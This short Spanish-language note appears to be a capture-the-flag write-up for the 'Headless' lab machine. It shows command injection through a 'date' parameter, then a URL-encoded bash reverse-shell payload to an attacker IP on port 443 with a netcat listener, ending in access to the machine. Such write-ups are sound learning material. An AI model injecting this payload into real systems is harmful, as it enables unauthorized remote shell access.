#commandinjection

------

![[Headless11.png]]
Vemos que si ponemos un ;date nos va a ejecutar el comando que le pongamos ya que nos tira el output de [[id]]


Ahora en el parametro *date* vamos a probar mandarnos una [[Reverse shell]] mientras estamos en escucha con [[nc -nlvp 443]]

vamos a agregar ``;bash -c "bash -i >%26 /dev/tcp/10.10.16.15/443 0>%261"``

![[Headless12.png]]

![[Headless13.png]]
Y ganamos acceso a la maquina